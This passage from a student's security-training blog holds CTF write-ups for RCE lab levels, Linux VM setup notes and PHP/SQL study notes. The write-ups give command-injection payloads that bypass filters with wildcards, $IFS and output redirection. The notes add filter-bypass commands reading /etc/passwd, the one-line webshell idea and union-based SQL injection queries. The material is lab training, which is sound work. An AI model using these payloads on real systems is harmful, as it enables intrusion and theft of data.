style="color:#000000;">所有字母(除了小写字母 </font><font style="color:#000000;">a</font><font style="color:#000000;">)</font></p><p><font style="color:#000000;">特殊字符  _ @ # % ^ &amp; * : { } - + &lt; &gt; “ | ; [ ]&#96;</font></p><p><font style="color:#000000;">由于</font><font style="color:#000000;">?代表的是匹配一个字符</font></p><p><font style="color:#000000;">所以构造palyload：</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=/???/?a??<span class="number">64</span> /??a? </span><br></pre></td></tr></table></figure><p><font style="color:#000000;">代表</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=/cat/base64 /flag </span><br></pre></td></tr></table></figure><p><font style="color:#000000;">得到</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737130165777-98aa4e98-1735-48a5-92c8-31380a22beff.png"></p><p><font style="color:#000000;">再base64解码的得flag</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737130120413-f219ad16-a3e9-4bbb-aa1f-5e2e7c2b135c.png"></p><h2 id="（八）-RCE-labs-Level-7-空格过滤"><a href="#（八）-RCE-labs-Level-7-空格过滤" class="headerlink" title="（八）[RCE-labs]Level 7 - 空格过滤"></a><font style="color:#000000;">（八）</font><font style="color:#000000;">[RCE-labs]Level 7 - 空格过滤</font></h2><p><font style="color:#000000;">打开靶场发现以下内容,是PHP代码</font></p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737130554364-714b2bbc-b979-4439-a401-b07301a098a0.png"></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag| /&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">这次又变成了绕过空格</font></p><p><font style="color:#000000;">题目上给的提示有$IFS可以代表空格</font></p><p><font style="color:#000000;">所以构造playload</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat$IFS/fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737130789222-99f02fff-6a45-4ba8-90e7-0f165eb99d4c.png"></p><h2 id="（九）-RCE-labs-Level-8-文件描述和重定向"><a href="#（九）-RCE-labs-Level-8-文件描述和重定向" class="headerlink" title="（九）[RCE-labs]Level 8 - 文件描述和重定向"></a><font style="color:#000000;">（九）</font><font style="color:#000000;">[RCE-labs]Level 8 - 文件描述和重定向</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737130925697-9bcc61fa-32f2-4a6b-8455-345c8a3d737f.png"></p><p><font style="color:#000000;">看了提示：&#x2F;dev&#x2F;null 是一个特殊的文件,写入到它的内容都会被丢弃；如果尝试从该文件读取内容,那么什么也读不到,并且&#x2F;dev&#x2F;null 将不会有任何回显,但会回显错误,加上 2&gt;&amp;1 后连错误也会被屏蔽掉</font></p><p><font style="color:#000000;">PHP代码如下:</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">/*&gt;/dev/null 将不会有任何回显,但会回显错误,加上 2&gt;&amp;1 后连错误也会被屏蔽掉*/</span></span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>.<span class="string">&quot;&gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">查阅资料,写这种题可以</font><font style="color:#000000;">尝试将cat &#x2F;flag的输出重定向到一个临时文件中,然后再通过其他命令读取这个临时文件的内容</font></p><p><font style="color:#000000;">创建临时文件：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag &gt; /tmp/temp_flag</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">读取临时文件内容：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/temp_flag</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">将这两个命令组合起来,可以构造如下命令：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag &gt; /tmp/temp_flag; cat /tmp/temp_flag;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">所以构造payload：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat /flag &gt; /tmp/temp_flag; cat /tmp/temp_flag;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">得到flag</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737131517139-50459889-2f3d-482a-9f0f-63f1589d844b.png"></p><h1 id="三、Linux环境搭建"><a href="#三、Linux环境搭建" class="headerlink" title="三、Linux环境搭建"></a><font style="color:#000000;">三、Linux环境搭建</font></h1><p><font style="color:#000000;">由于之前在开课前做准备工作的时候已经搭建好了一个Linux环境,没截图,所以就大概说一下吧</font></p><ol><li><font style="color:#000000;">下载并安装VMware</font></li></ol><p><font style="color:#000000;">在</font><font style="color:#000000;">HnuSec2025冬季培训</font><font style="color:#000000;">❄️</font><font style="color:#000000;">群里有安装包</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132098742-43adea72-d552-4a1b-872c-bd18eeb93854.png"></p><p><font style="color:#000000;">官网下载：</font></p><p><a href="https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion"><font style="color:#117CEE;">https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion</font></a></p><p><font style="color:#000000;">之后打开安装包设置好路径添加path就行</font></p><ol start="2"><li><font style="color:#000000;">安装映像</font></li></ol><p><font style="color:#000000;">打开VMware后,需要选择一个虚拟机的光盘映像文件,我这里选择的是</font><font style="color:#000000;">ubuntu</font><font style="color:#000000;">的,可以去ubuntu下载：</font><a href="https://cn.ubuntu.com/download/desktop"><font style="color:#000000;">官网跳转链接</font></a></p><p><font style="color:#000000;">下载好之后就是这个文件</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132614360-69c37838-cb17-4e33-845f-7b339001c85b.png"></p><ol start="3"><li><font style="color:#000000;">新建虚拟机</font></li></ol><p><font style="color:#000000;">基本上都是选择默认,如果有其他需求可以适当改一下</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132745911-0837e66d-e934-4adc-aa4c-cc5e4d984281.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132767120-d714a311-3bd7-46cd-a8f9-bb6fc4dbd76a.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132782984-37ab8bd1-54ef-4567-b7d5-277a8d6fb758.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132792199-8c164909-8abd-4e22-bb70-e586a6d2994e.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132834700-2bb2eb3e-70fd-45c6-b49b-ff0b596db713.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132847080-e506a61c-c3f8-4b79-8950-4609248dd0d1.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132857606-8bc92a1a-cc19-4047-8f09-31ed223c5d9a.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132866152-4001408d-7a3e-4a53-98e3-7844c49a55ec.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132874793-a5768df2-e1f5-4a16-aceb-434918db89af.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132882743-b7baddda-d2a2-46d9-b957-e59f3a252d29.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132907066-308edd5f-e46f-4377-bd26-60bbd848acdb.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132918740-170fc6a1-6516-4f1a-86b9-67bf84f55747.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132925361-67f86b6d-608d-446e-834e-c142ba56e60f.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132948725-fb887163-8bc5-4ee7-9e28-81c6393e3245.png"></p><p><font style="color:#000000;">在最后一步选择自定义硬件,点击新CD&#x2F;DVD(SATA),选择使用ISO镜像文件,之后点击完成</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132966791-76ce93fa-7f54-46a6-a4cc-4c7bc4cf63fb.png"></p><p><font style="color:#000000;">打开虚拟机,要设置语言、地区、用户名、密码等操作,之后虚拟机会重启</font></p><p><font style="color:#000000;">可以执行以下命令</font><font style="color:#000000;">安装常用的包和工具</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># 切换到root用户,避免重复输入sudo</span><br><span class="line">sudo su</span><br><span class="line"></span><br><span class="line"># 更新软件包列表,获取最新的软件包信息</span><br><span class="line">sudo apt update -y</span><br><span class="line"></span><br><span class="line"># 升级已安装的所有软件包到最新版本</span><br><span class="line">sudo apt upgrade -y</span><br><span class="line"></span><br><span class="line"># 安装build-essential,包含了编译软件所需的基本工具,如gcc、g++和make等</span><br><span class="line">sudo apt install build-essential -y</span><br><span class="line"></span><br><span class="line"># 安装git版本控制系统,用于代码管理和版本控制</span><br><span class="line">sudo apt install git -y</span><br><span class="line"></span><br><span class="line"># 安装zip和unzip工具,用于处理压缩文件</span><br><span class="line">sudo apt install zip unzip -y</span><br><span class="line"></span><br><span class="line"># 安装网络工具包：</span><br><span class="line"># net-tools：包含ifconfig、netstat等常用网络命令</span><br><span class="line"># curl：用于发送HTTP请求的命令行工具</span><br><span class="line"># wget：用于从网络下载文件的工具</span><br><span class="line">sudo apt install net-tools curl wget -y</span><br><span class="line"></span><br><span class="line"># 安装SSH服务器,允许远程安全连接到此服务器</span><br><span class="line">sudo apt install openssh-server -y</span><br><span class="line"></span><br><span class="line"># 停止ufw防火墙服务</span><br><span class="line"># 注意：在生产环境中建议保持防火墙开启,根据个人情况决定</span><br><span class="line">sudo systemctl stop ufw -y</span><br><span class="line"></span><br><span class="line"># 禁用ufw防火墙开机自启</span><br><span class="line"># 注意：在生产环境中建议保持防火墙启用,根据个人情况决定</span><br><span class="line">sudo systemctl disable ufw -y</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">这下虚拟机的配置基本完成了</font></p><ol start="4"><li><font style="color:#000000;">linux操作笔记ls ：<br></font><font style="color:#000000;">ls ：列出当前目录的文件和文件夹。<br></font><font style="color:#000000;">ls -l ：以详细列表形式显示。</font></li></ol><p><font style="color:#000000;">ls -a ：显示所有文件,包括隐藏文件。<br></font><font style="color:#000000;">cd ：切换目录<br></font><font style="color:#000000;">cd 目录名 ：进⼊指定目录。<br></font><font style="color:#000000;">cd .. ：返回上⼀级目录。<br></font><font style="color:#000000;">cd ~ ：回到用户的主目录。<br></font><font style="color:#000000;">pwd ：显⽰当前所在目录<br></font><font style="color:#000000;">mkdir ：创建目录<br></font><font style="color:#000000;">mkdir 目录名 ：创建⼀个新的⽬录。<br></font><font style="color:#000000;">rmdir ：删除空目录<br></font><font style="color:#000000;">rmdir 目录名 ：删除⼀个空的目录。<br></font><font style="color:#000000;">rm ：删除文件或目录<br></font><font style="color:#000000;">rm ⽂件名 ：删除⽂件。<br></font><font style="color:#000000;">rm -r 目录名 ：递归删除目录及其内容（谨慎使⽤）。<br></font><font style="color:#000000;">cp ：复制文件或目录<br></font><font style="color:#000000;">cp 源文件 目标文件 ：复制文件。<br></font><font style="color:#000000;">cp -r 源目录 目标目录 ：复制目录目录。<br></font><font style="color:#000000;">mv ：移动或重命名文件或目录<br></font><font style="color:#000000;">mv 源文件 目标文件 ：重命名文件。<br></font><font style="color:#000000;">mv 源文 目标目录 ：移动文件到目标目录。<br></font><font style="color:#000000;">cat ：查看文件内容。</font></p><p><font style="color:#000000;">简单操作了以下</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737135007653-dd6267d5-7ad0-4971-8fae-88dd68e88dc3.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737135006834-3e80beca-aa4c-4f85-9b27-b22bf8ce3b6f.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737135007082-ac344310-9ff0-4cda-b926-5cc304c3f35f.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737135007042-2882f6ed-7daf-46ce-a630-b2b02d01876e.png"></p><h1 id="四、PHP基本语法"><a href="#四、PHP基本语法" class="headerlink" title="四、PHP基本语法"></a><font style="color:#000000;">四、PHP基本语法</font></h1><p><font style="color:#000000;">之前写过笔记了再加上一点新学的：</font></p><p><font style="color:#000000;">1. evel()函数 </font></p><p><font style="color:#000000;">eval() 函数是 PHP 中⼀个⾮常特殊的函数,它可以将⼀个字符串当作 PHP 代码来执行。这个功能 </font></p><p><font style="color:#000000;">非常强大,但也非常危险,如果使⽤不当,可能会导致严重的安全问题。 </font></p><p><font style="color:#000000;">eval() </font><font style="color:#000000;">函数的语法： </font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> ( <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">mixed</span> </span><br></pre></td></tr></table></figure><p><font style="color:#000000;">$code ：要执行的 PHP 代码字符串。 </font></p><p><font style="color:#000000;">eval() </font><font style="color:#000000;">函数的作用： </font></p><p><font style="color:#000000;">eval() </font><font style="color:#000000;">函数会将 </font><font style="color:#000000;">$code </font><font style="color:#000000;">字符串中的内容解析为 PHP 代码,并执⾏它。执⾏的代码会继承 </font></p><p><font style="color:#000000;">eval() 函数所在行的变量作用域。也就是说,在 eval() 中可以访问和修改 eval() 函数外部的变量。 </font></p><p><font style="color:#000000;">2.system()</font></p><p><font style="color:#000000;">system — 执行外部程序,并且显示输出</font></p><p><font style="color:#000000;">3.pcntl_exec() </font></p><p><font style="color:#000000;">pcntl_exec() 是 PHP 的⼀个函数,用于在 当前进程空间执行指定的程序。它属于 PHP 的 Process Control 扩展（pcntl）,主要用于处理 Unix&#x2F;Linux 系统中的进程管理。与之前提到的system() 、 exec() 、 shell_exec() 等函数不同, pcntl_exec() 不会创建新的子进程,而是替换当前进程。这意味着调用pcntl_exec() 之后,原来的 PHP 脚本将停止执行,取而代之的是执行指定的程序。 </font></p><p><font style="color:#000000;">函数原型： </font></p><p><font style="color:#000000;">$path : 要执行的程序的路径。可以是绝对路径或相对路径。 </font></p><p><font style="color:#000000;">$args : （可选）传递给程序的参数数组。</font></p><p><font style="color:#000000;">$envs : （可选）传递给程序的环境变量数组。</font></p><p><font style="color:rgb(31,35,41);">4.exec() </font></p><p><font style="color:rgb(31,35,41);">基本语法： </font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string exec ( string $command , array &amp;$output = null , int &amp;$return_var = null </span><br><span class="line">) : string </span><br></pre></td></tr></table></figure><p><font style="color:rgb(31,35,41);">$command : 要执行的命令,可以是任何有效的系统命令。 </font></p><p><font style="color:rgb(31,35,41);">$output : 可选参数,用于存储命令执行的输出结果。每⾏输出将作为数组的⼀个元素。 </font></p><p><font style="color:rgb(31,35,41);">$return_var : 可选参数,用于存储命令执行后的返回状态码。通常,状态码 0 表⽰命令成功执 </font></p><p><font style="color:rgb(31,35,41);">行。</font></p><p><font style="color:rgb(31,35,41);">5.var_dump </font></p><p><font style="color:#000000;">var_dump() 是 PHP 中⼀个非常有用的内置函数,主要用于输出变量的详细信息,包括变量的类型和值。它在调试代码和分析变量状态时非常有用。 </font></p><p><font style="color:#000000;">var_dump() 的作用： </font></p><p><font style="color:#000000;">显示变量的类型： 例如, int （整型）、 string （字符串）、 bool （布尔型）、 array （数组）、 object （对象）等。 </font></p><p><font style="color:#000000;">显示变量的值： 输出变量的具体内容。</font></p><p><font style="color:#000000;">递归展开数组和对象： 对于数组和对象, var_dump() 会递归地显示其内部的元素和属性,并使用缩进清晰地展示其结构。显示字符串的长度： 如果变量是字符串,还会显示字符串的长度</font></p><p><font style="color:#000000;">6.session_start();是PHP中的一个函数,用于启动一个会话。当一个用户访问网站时,会话（Session）是用来存储用户特定数据的一种机制,这些数据可以被多个页面共享。通过启动会话,PHP能够识别用户,并在用户的多次请求之间保存数据。</font></p><p><font style="color:#000000;">7. PhpStorm环境配置完成</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737139725797-e79271a2-2507-4b8d-92e2-fa85f91c1164.png"></p><p><font style="color:#000000;">附上之前PHP学习笔记链接：</font><a href="https://github.com/Fischl0527/Fischl0527/blob/main/PHP%E5%AD%A6%E4%B9%A0%E5%8F%8A%E7%BB%83%E4%B9%A0.md">PHP学习及练习</a></p><h1 id="五、学习笔记汇总"><a href="#五、学习笔记汇总" class="headerlink" title="五、学习笔记汇总"></a><font style="color:#000000;">五、学习笔记汇总</font></h1><p><font style="color:#000000;">[任意代码执行行(Arbitrary Code Execution,ACE)]是指政击者在目标计算机或目标进行中运行攻击者选择的任何命令或代码的能力,这是一个广泛的概念,它涵盖了任何类型的代码运行过程,不仅包括系统层领的脚本或程序,也包括应用程序内部的函数或方法调用,在此基础上我们将通过网络触发任意代码执行的能力通常称为远程代码执行   [远程程代码执行(AFE.RranteCodeExecut1oe,RCE)]</font></p><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">[命令执行(Conennd Execution)]     通常指的是在操作系统层面上执行预定义的指令或脚本,这些命令最终的组向通常是系统命令,如Windows中的CMD命令或Linux中的Shell命令,这在语言中可以体现为一些特定的函数或方法调用,如PHP中的shell_exec()函数。</font></p><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">代码执行(CodeExecution)」在某个语言中,通过一些方式(通常为函数或者方法调用)执行该语言的任意代码的行为,如PHP中的eval()函数或Python中的exec()函数。当漏洞入口点可以执行任意代码时,我们称其为代码执行漏洞——这种漏洞包含了通过语言中对接系统命令的函数来执行系统命令的情况,比如eval(“system(‘cat  &#x2F;etc&#x2F;passward’)”;)；也被归为代码执行漏洞。我们平时最常见的一句话木马就用的eval()函数,（一般情况下,为了接收更长的Payload,我们一般对可控参数使用POST传参）</font></p><p><font style="color:#000000;"></font></p><p><font style="color:rgb(31,35,41);">一句话木马是⼀种简短的恶意代码,通常⽤于在⽬标服务器上创建⼀个后门,以便攻击者远程控制该 </font></p><p><font style="color:rgb(31,35,41);">服务器或执行其他恶意操作。它主要出现在 Web 安全领域,特别是涉及 PHP、ASP、JSP 等动态语⾔ </font></p><p><font style="color:rgb(31,35,41);">的 Web 应用程序中。</font></p><p><font style="color:rgb(31,35,41);"></font></p><p><font style="color:#000000;">除开在一句话木马中最受欢迎用以直接执行php代码的 eval() 函数,php还有许多回调函数也可以直接或者间接的执行php代码。查了资料,assert就可以,但它无法执行关于echo的代码,但却能用print</font></p><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">shell 运算符 可以用于控制命令的执行流程,使得你能够根据条件执行不同的命令。</font></p><p><font style="color:#000000;">&amp;&amp;(逻辑与运算符） 只有当第 1个命令 cmd_1执行成功 (返回值为 0)时,才会执行第2个命令 cmd_2 。例： mkdir test &amp;&amp; cd test</font></p><p><font style="color:#000000;">(逻辑或运算符） 只有当第一个命令 cmd_1 执行失败 (返回值不为 0)时,才会执行第二个命令 cmd_2 。例： cd nonexistent_directory || echo “directory not found“</font></p><p><font style="color:#000000;">(后台运行符） 将命令 cmd_1 放到后台执行,shell 立即执行,cmd_2,两个命令并行执行。例： sleep 10 &amp; echo “this will run immediately”</font></p><p><font style="color:#000000;">;(命令分隔符） 无论前 一个命令 cmd_1是否成功, 都会执行下个命令 </font></p><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">在shell中,单&#x2F;双引号 可以用来定义一个空字符串或保护包含空格或特殊字符的字符串。</font></p><p><font style="color:#000000;">例如：echo “$”a 会输出 $a, 而 echo $a 会输出变量a的值,当只有”则表示空字符串,shell会忽略它。</font></p><p><font style="color:#000000;">*(星号） 匹配零个或多个字符。例子： *.txt.</font></p><p><font style="color:#000000;">?(问号） 匹配单个字符。例子： file?.txt.</font></p><p><font style="color:#000000;">[](方括号） 匹配方括号内的任意一个字符。例子： file[l-3].txt.</font></p><p><font style="color:#000000;">{}(大括号）:匹配大括号内的任意一个字符串。例子：  file{1,2,3}.txt.</font></p><p><font style="color:#000000;">通过组合上述技巧,我们可以用于绕过ctf中一些简单的过滤：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system (&quot;c&#x27;&#x27;at  /e&#x27;t&#x27;c/pass?d&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system( sem(&quot;/???/?at   /e&#x27;t&#x27;c/pass?d&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system (*/???/?at   /e&#x27;t&#x27;c/*ss*&#x27;);</span><br></pre></td></tr></table></figure><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">在遇到空格被过滤的情况下,通常使用%09也就是TAB的URL编码来绕过,在终端环境下空格被视为一个命令分隔符,本质上由$IFS变量控制,而$IFS的默认值是空格、制表符和换行符,所以我们还可以通过直接键入$IFS来绕过空格过滤。</font></p><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">大多数UNIX系统命令从你的终端接受输入并将所产生的输出发送回到您的终端。一个命令通常从一个叫标准输入的地方读取输入,默认情况下,这恰好是你的终端。同样,一个命令通常将其输出写入到标准输出,默认情况下,这也是你的终端——这些是命令有回显的基础。如果希望执行某个命令,但又不希望在屏幕上显示输出结果,那么可以将输出重定向到&#x2F;dev&#x2F;null；</font></p><p><font style="color:#000000;">&#x2F;dev&#x2F;null 是一个特殊的文件,写入到它的内容都会被丢弃；如果尝试从该文件读取内容,那么什么也读不到。但是&#x2F;dev&#x2F;null文件非常有用,将命令的输出重定向到它,会起到“禁止输出”的效果如果希望屏蔽stdout和stderr,可以这样写：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ command  &gt;  /dev/null   2&gt;&amp;1</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">如果想要绕过此限制,那么就想方设法的</font><font style="color:#000000;">将cat &#x2F;flag的输出重定向到一个临时文件中,然后再通过其他命令读取这个临时文件的内容,以达到读取flag的效果</font></p><p>SQL注入语句：</p><p>SQL注入大致分为联合注入、布尔盲注、延时盲注和报错注入这次主要是联合注入笔记</p><p>万能密码：1</p><p>基本注入语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username = &#x27;admin&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; and password = &#x27;anything&#x27;;</span><br></pre></td></tr></table></figure><p>联合注入:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from person where id = 1 union select 1,2,database(),4,5</span><br></pre></td></tr></table></figure><p>注意,两者字段数必须相等,判断字段数时,可以使用order by num,一次增大num,直到出现错误就结束来判断字段数是num-1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from person where id = 1 union select 1,2,(select table_name from infomation_schema.tables where table_schema=database() limit 0,1),4,5</span><br></pre></td></tr></table></figure><p>可以使用limit对查询的对象限定,注意限定列表是从0开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from person where id = 1 union select 1,2,(select group_concat(table_name) from infomation_schema.tables where table_schema=database() limit 0,1),4,5</span><br></pre></td></tr></table></figure><p>使用group_concat联合表名也可以</p><p>如果是查询具体数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from person where id = 1 union select 1,concat(usernamme,0x5c,passward),3,4,5 from admin;</span><br></pre></td></tr></table></figure><p>或加上限定limit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from person where id = 1 union select 1,concat(usernamme,0x5c,passward),3,4,5 from admin limit 0,2;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">最后,这是一个神奇的链接,能让我们度过一个</font><font style="color:#DF2A3F;">快！乐！充！实！</font><font style="color:#000000;">的寒假：</font></p><p><a href="https://ys-api.mihoyo.com/event/download_porter/link/ys_cn/official/pc_default"><font style="color:#117CEE;">https://ys-api.mihoyo.com/event/download_porter&#x2F;link&#x2F;ys_cn&#x2F;official&#x2F;pc_default</font></a></p>]]></content>
      
      
      <categories>
          
          <category> 2025Win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Training </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025 Win Homework 0</title>
      <link href="/2025/01/13/2025Win/2025%20Win%20Homework%200/"/>
      <url>/2025/01/13/2025Win/2025%20Win%20Homework%200/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="Ez1kQ"><font style="color:#000000;">一、PHP语言基础</font></h1><font style="color:#000000;">由于之前写过PHP笔记，这里的PHP知识作为补充</font><h2 id="JNFpO"><font style="color:#000000;">（一）php基础1</font></h2>知识链接：<p><a href="https://github.com/natro92/HnuSec-Training-Website/blob/main/docs/file/PHP1.pdf">https://github.com/natro92/HnuSec-Training-Website/blob/main/docs/file/PHP1.pdf</a></p><ul><li><font style="color:#000000;">通过函数修改全局变量要在变量前加上global</font></li><li><font style="color:#000000;">常量名不加$修饰符</font></li><li><font style="color:#000000;">常量定义：</font><ul><li><font style="color:#000000;">bool </font><font style="color:#000000;">define </font><font style="color:#000000;">( </font><font style="color:#000000;">string </font><font style="color:#000000;">$name </font><font style="color:#000000;">, </font><font style="color:#000000;">mixed </font><font style="color:#000000;">$value </font><font style="color:#000000;">[, </font><font style="color:#000000;">bool </font><font style="color:#000000;">$case_insensitive </font><font style="color:#000000;">&#x3D; 